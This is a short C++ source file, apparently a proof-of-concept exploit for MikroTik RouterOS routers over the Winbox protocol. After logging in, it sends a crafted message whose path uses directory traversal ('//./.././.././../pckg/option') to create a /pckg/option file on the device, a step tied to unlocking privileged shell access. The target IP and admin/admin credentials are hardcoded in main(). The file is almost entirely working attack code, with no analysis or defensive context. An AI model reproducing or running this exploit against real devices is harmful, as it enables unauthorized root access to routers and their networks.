#include "../../common/winbox_message.hpp"

#include <sstream>
#include <cstdlib>
#include <iostream>
#include <boost/cstdint.hpp>
#include "../../common/md5.hpp"
#include <boost/program_options.hpp>
#include "../../common/winbox_session.hpp"
bool create_file(const std::string& p_ip, const std::string& p_port,
                 const std::string& p_username, const std::string& p_password)
{
    Winbox_Session mproxy_session(p_ip, p_port);
    if (!mproxy_session.connect())
    {
        std::cerr << "[-] Failed to connect to the remote host" << std::endl;
        return false;
    }

    boost::uint32_t p_session_id = 0;
    if (!mproxy_session.login(p_username, p_password, p_session_id))
    {
        std::cerr << "[-] Login failed." << std::endl;
        return false;
    }

    std::cout << "[+] Creating /pckg/option on " << p_ip << ":" << p_port << std::endl;

    WinboxMessage msg;
    msg.set_to(2, 2);
    msg.set_command(1);
    msg.set_request_id(1);
    msg.set_reply_expected(true);
    msg.set_session_id(p_session_id);
    msg.add_string(1, "//./.././.././../pckg/option");
    mproxy_session.send(msg);

    msg.reset();
    mproxy_session.receive(msg);
    if (msg.has_error())
    {
        std::cout << "[-] " << msg.get_error_string() << std::endl;
        return false;
    }
    return true;
}
int main(){
	create_file("192.168.91.134","8291","admin","admin");

	return 0;
} 
